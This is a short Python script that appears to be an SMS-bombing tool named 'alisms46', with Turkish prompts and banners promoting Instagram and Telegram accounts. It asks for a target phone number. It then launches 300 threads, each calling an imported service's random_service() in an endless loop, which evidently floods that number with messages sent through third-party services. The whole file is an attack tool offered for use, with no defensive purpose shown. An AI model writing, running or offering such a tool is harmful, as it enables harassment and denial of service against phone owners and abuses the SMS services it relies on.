import sys, os, pyfiglet
from alismsService import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()

def start(phone):
        attack_number_phone.phone(phone)

        while True:
            try:
                attack_number_phone.random_service()
            except Exception as ex:
                print(ex)

os.system('clear')

print(Fore.YELLOW + pyfiglet.figlet_format("alisms46"))

print('''
     _________________
    /                 \
    |                 |
    | .-----.   .--.  |
    | | Ali |  /    \ |
    | '-----'  \    / |
    |           |  |  |
    | LI LI LI  |  |  |
    | LI LI LI  |  |  |
    | LI LI LI  |  |  |
    | LI LI LI  |  |  |
    |           |  |  |
    | .------. /    \ |
    | | Ali  | \    / |
    | '------'  '--'  |
    |          .----. |
    |          ||  || |
    |          |'--'| |
    |          '----' |
    \_________________/
''')

print('============')
print(Fore.GREEN + 'İnstagram: @javin.sensei ')
print(Fore.GREEN + 'Telegram: @xKurt0tr')
print(Fore.BLUE + '++++++++++++++++++')
print(Fore.RED + 'VİA: https://t.me/ARELDEV_CHANNEL')
print(Fore.BLUE + '++++++++++++++++++')
print(Fore.YELLOW + '============')
phone = input('NUMARA: ')
print('============')

try:
        attack_number_phone.phone(phone)
except:
        print(Fore.RED + 'Numarayı Yanlış Girdiniz Tekrar Deneyin ÖRNEK: +905551235500')
        sys.exit()


for i in range(300):
        th = Thread(target=start, args=(phone,))
        th.start()
